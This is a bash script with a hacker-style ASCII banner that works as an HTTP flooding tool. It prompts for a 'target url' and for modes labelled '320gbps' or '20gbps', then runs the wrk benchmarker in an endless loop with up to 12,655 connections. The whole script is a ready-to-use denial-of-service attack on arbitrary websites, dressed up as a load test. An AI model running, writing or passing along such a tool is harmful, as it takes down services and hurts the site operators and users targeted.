#!/bin/bash

clear

cat << "EOF"
⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣤⣤⣤⣀⡀
⠄⠄⠄⣠⣤⢶⣻⣿⣻⣿⣿⣿⣿⣿⣿⣦⣤⣀
⠄⠄⣼⣺⢷⣻⣽⣾⣿⢿⣿⣷⣿⣿⢿⣿⣿⣿⣇
⠠⡍⢾⣺⢽⡳⣻⡺⣽⢝⢗⢯⣻⢽⣻⣿⣿⣿⣿⢿⡄
⡨⣖⢹⠜⢅⢫⢊⢎⠜⢌⠣⢑⠡⣹⡸⣜⣯⣿⢿⣻⣷
⢜⢔⡹⡭⣪⢼⠽⠷⠧⣳⢘⢔⡝⠾⠽⢿⣷⣿⣟⢷⣟
⢸⢘⢼⠿⠟⠁⠄⠄⡀⠄⠃⠑⡌⠄⠄⠈⠙⠿⣷⢽⣻
⢌⠂⠅⠄⠄⠄⠄⠄⠄⡀⣲⣢⢂⠄⠄⠄⠄⠄⠈⣯⠏
⠐⠨⡂⠄⠄⠄⠄⠄⡀⡔⠋⢻⣤⡀⠄⠄⢀⠄⢸⣯⠇
⠈⣕⠝⠒⠄⠄⠒⢉⠪⠄⠄⠄⢿⠜⠑⠢⠠⡒⡺⣿⠖
⠄⠐⠅⠁⡀⠄⠐⢔⠁⠄⠄⠄⢀⢇⢌⠄⠄⠄⠸⠕
⠄⠄⠂⠄⠄⠨⣔⡝⠼⡄⠂⣦⡆⣿⣲⠐⠑⠁⠄⠃
⠄⠄⠄⠄⠄⠄⠃⢫⢛⣙⡊⣜⣏⡝⣝⠆
⠄⠄⠄⠄⠄⠄⠈⠈⠁⠁⠁⠈⠈⠊

           made by j1ckxr3pp3r
EOF

trap "echo; echo 'Interrupted. Exiting...'; exit 0" SIGINT

echo "Choose mode:"
echo "1) 320gbps"
echo "2) 20gbps	"
echo "3) Custom threads & connections"
read -p "(1, 2, or 3): " choice

read -p "Target url : " url

if [ "$choice" == "1" ]; then
    threads=32
    connections=12655
elif [ "$choice" == "2" ]; then
    threads=10
    connections=10000
elif [ "$choice" == "3" ]; then
    read -p "Threads (-t): " threads
    read -p "Connections (-c): " connections
else
    echo "Invalid choice"
    exit 1
fi

while true; do
    echo "trying $(date)..."
    wrk -t"$threads" -c"$connections" -d60s --timeout 10s --latency "$url"
    echo "Run finished. Restarting..."
done
   
